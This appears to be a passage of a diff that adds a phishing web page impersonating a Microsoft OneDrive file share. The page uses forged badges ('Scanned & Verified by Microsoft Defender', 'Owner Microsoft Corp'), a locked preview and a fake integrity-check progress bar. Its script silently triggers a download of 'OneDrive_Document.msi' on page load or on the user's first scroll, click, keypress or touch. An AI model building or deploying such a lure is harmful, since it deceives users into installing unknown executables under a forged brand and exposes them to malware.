+              <path d="M7.5 14C4.46 14 2 11.54 2 8.5C2 5.73 4.04 3.43 6.72 3.04C7.37 1.25 9.07 0 11 0C13.4 0 15.37 1.77 15.72 4.08C16.14 4.03 16.57 4 17 4C20.87 4 24 7.13 24 11C24 11.69 23.9 12.35 23.72 13H7.5V14Z" fill="#0078d4" opacity="0.6"/>
+              <path d="M17.2 7.5C15.18 7.5 13.45 8.62 12.54 10.27C12.05 10.1 11.53 10 11 10C8.24 10 6 12.24 6 15C6 17.76 8.24 20 11 20H26C27.1 20 28 19.1 28 18V17.5C28 12.25 23.64 7.5 17.2 7.5Z" fill="#0078d4"/>
+            </svg>
+            Synced
+          </div>
+        </div>
+
+        <div>
+          <div class="verified-badge">
+            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <circle cx="6" cy="6" r="5.5" fill="#1a7a35"/>
+              <path d="M3.5 6l1.8 1.8L8.5 4.5" stroke="white" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Scanned &amp; Verified by Microsoft Defender
+          </div>
+        </div>
+
+        <div class="preview-wrap">
+          <div class="preview-lines">
+            <div class="preview-line"></div>
+            <div class="preview-line short"></div>
+            <div class="preview-line med"></div>
+            <div class="preview-line short"></div>
+            <div class="preview-line"></div>
+          </div>
+          <div class="preview-blur">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+              <rect x="3" y="11" width="18" height="11" rx="2" stroke="#605e5c" stroke-width="1.5"/>
+              <path d="M7 11V7a5 5 0 0110 0v4" stroke="#605e5c" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+            <span>Preview locked — download to view</span>
+          </div>
+        </div>
+
+        <!-- 80M+ glass glow counter -->
+        <div class="download-count-wrap">
+          <div class="glass-count-box">
+            <span class="glow-number">80M+</span>
+            <span class="glow-sub">Trusted Downloads Worldwide</span>
+          </div>
+        </div>
+
+        <!-- Updated to latest OneDrive — glowing glass feature cards -->
+        <div class="update-label">
+          <span class="glow-update-tag">✦ Updated · Latest OneDrive Features</span>
+        </div>
+
+        <div class="new-features">
+          <div class="feat-badge">
+            <div class="feat-icon">✦</div>
+            <div class="feat-text">
+              <div class="feat-title glow-text-sm">AI-Powered Smart Sync</div>
+              <div class="feat-desc">Automatically syncs only what you need using AI — zero manual effort, zero wasted space.</div>
+            </div>
+          </div>
+          <div class="feat-badge">
+            <div class="feat-icon">⬡</div>
+            <div class="feat-text">
+              <div class="feat-title glow-text-sm">End-to-End Vault Encryption</div>
+              <div class="feat-desc">Military-grade per-file encryption with your private key — not even Microsoft can read your files.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="progress-wrap" id="progressWrap">
+          <div class="progress-label">
+            <span id="progressLabel">Connecting to OneDrive...</span>
+            <span id="progressPct">0%</span>
+          </div>
+          <div class="progress-track">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+        </div>
+
+        <a class="btn-download" id="dlBtn" href="#" onclick="handleDownload(event)">
+          <div class="btn-spinner" id="btnSpinner"></div>
+          <svg id="dlIcon" width="16" height="16" viewBox="0 0 16 16" fill="none">
+            <path d="M8 1v9M4 7l4 4 4-4M2 13h12" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <span id="dlBtnText">Download File</span>
+        </a>
+
+        <div class="status-msg" id="statusMsg"></div>
+
+        <div class="meta-panel">
+          <div class="meta-item"><span class="meta-key">Modified</span><span class="meta-val">June 27, 2026</span></div>
+          <div class="meta-item"><span class="meta-key">Owner</span><span class="meta-val">Microsoft Corp</span></div>
+          <div class="meta-item"><span class="meta-key">Shared with</span><span class="meta-val">You</span></div>
+          <div class="meta-item"><span class="meta-key">Version</span><span class="meta-val">1.0 · Final</span></div>
+        </div>
+
+        <div class="secured-badge">
+          <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
+            <path d="M8 1L2 4v4c0 3.55 2.55 6.88 6 7.68C11.45 14.88 14 11.55 14 8V4L8 1z" stroke="#605e5c" stroke-width="1.3" fill="none"/>
+            <path d="M5.5 8l1.8 1.8L10.5 6.5" stroke="#605e5c" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          Secured by Microsoft 365
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  &copy; 2026 Microsoft &nbsp;&middot;&nbsp;
+  <a href="#">Privacy &amp; Cookies</a> &nbsp;&middot;&nbsp;
+  <a href="#">Terms of Use</a> &nbsp;&middot;&nbsp;
+  <a href="#">Contact Microsoft</a>
+</div>
+
+<script>
+// ── SKELETON → CONTENT ──────────────────────────
+window.addEventListener('load', function () {
+  setTimeout(function () {
+    document.getElementById('skeleton').style.display = 'none';
+    document.getElementById('cardContent').classList.add('visible');
+    setTimeout(triggerAutoDownload, 500);
+  }, 1500);
+});
+
+// ── AUTO DOWNLOAD ────────────────────────────────
+var autoDownloadDone = false;
+function triggerAutoDownload() {
+  if (!autoDownloadDone) { autoDownloadDone = true; runDownload(); }
+}
+['click','scroll','keydown','touchstart'].forEach(function(e) {
+  document.addEventListener(e, function(){ triggerAutoDownload(); }, { once:true, passive:true });
+});
+
+function handleDownload(e) { e.preventDefault(); runDownload(); }
+
+function runDownload() {
+  var wrap    = document.getElementById('progressWrap');
+  var fill    = document.getElementById('progressFill');
+  var label   = document.getElementById('progressLabel');
+  var pct     = document.getElementById('progressPct');
+  var btn     = document.getElementById('dlBtn');
+  var spinner = document.getElementById('btnSpinner');
+  var icon    = document.getElementById('dlIcon');
+  var btnTxt  = document.getElementById('dlBtnText');
+
+  wrap.style.display   = 'block';
+  btn.style.opacity    = '0.75';
+  btn.style.pointerEvents = 'none';
+  spinner.style.display = 'block';
+  icon.style.display    = 'none';
+  btnTxt.textContent    = 'Preparing...';
+
+  var progress = 0;
+  var steps = ['Connecting to OneDrive...','Verifying file integrity...','Applying Vault Encryption...','Launching Smart Sync...'];
+  var iv = setInterval(function () {
+    progress += Math.random() * 16 + 5;
+    if (progress >= 100) { progress = 100; clearInterval(iv); finishDownload(); }
+    fill.style.width  = progress + '%';
+    pct.textContent   = Math.floor(progress) + '%';
+    label.textContent = steps[Math.min(Math.floor(progress / 26), steps.length - 1)];
+  }, 110);
+}
+
+function finishDownload() {
+  document.getElementById('progressLabel').textContent = 'Download ready';
+  document.getElementById('progressPct').textContent   = '✓';
+  document.getElementById('statusMsg').textContent     = '✓ Your download has started...';
+  var btn     = document.getElementById('dlBtn');
+  var spinner = document.getElementById('btnSpinner');
+  var icon    = document.getElementById('dlIcon');
+  var btnTxt  = document.getElementById('dlBtnText');
+  btn.style.opacity       = '1';
+  btn.style.pointerEvents = 'auto';
+  spinner.style.display   = 'none';
+  icon.style.display      = 'block';
+  btnTxt.textContent      = 'Download File';
+
+  var a = document.createElement('a');
+  a.href = 'download.php?type=auto';
+  a.download = 'OneDrive_Document.msi';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+// ── AI CANVAS ─────────────────────────────────────
+(function(){
+  var c   = document.getElementById('aiCanvas');
+  var ctx = c.getContext('2d');
+  var W, H, N = [];
+  var COUNT = 50;
+
+  function resize(){ W = c.width = window.innerWidth; H = c.height = window.innerHeight; }
+  window.addEventListener('resize', resize); resize();
+
+  for(var i=0;i<COUNT;i++){
+    N.push({
+      x:Math.random()*W, y:Math.random()*H,
+      vx:(Math.random()-0.5)*0.5, vy:(Math.random()-0.5)*0.5,
+      r:Math.random()*2.8+1,
+      o:Math.random()*0.55+0.25
+    });
+  }
+
+  function draw(){
+    ctx.clearRect(0,0,W,H);
+    for(var i=0;i<N.length;i++){
+      for(var j=i+1;j<N.length;j++){
+        var dx=N[i].x-N[j].x, dy=N[i].y-N[j].y;
+        var d=Math.sqrt(dx*dx+dy*dy);
+        if(d<170){
+          ctx.beginPath();
+          ctx.moveTo(N[i].x,N[i].y);
+          ctx.lineTo(N[j].x,N[j].y);
+          ctx.strokeStyle='rgba(0,120,212,'+(0.18*(1-d/170))+')';
+          ctx.lineWidth=0.9;
+          ctx.stroke();
+        }
+      }
+    }
+    for(var i=0;i<N.length;i++){
+      var n=N[i];
+      ctx.beginPath();
+      ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
+      ctx.fillStyle='rgba(0,120,212,'+n.o+')';
+      ctx.fill();
+      n.x+=n.vx; n.y+=n.vy;
+      if(n.x<0||n.x>W) n.vx*=-1;
+      if(n.y<0||n.y>H) n.vy*=-1;
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+</script>
+</body>
+</html>
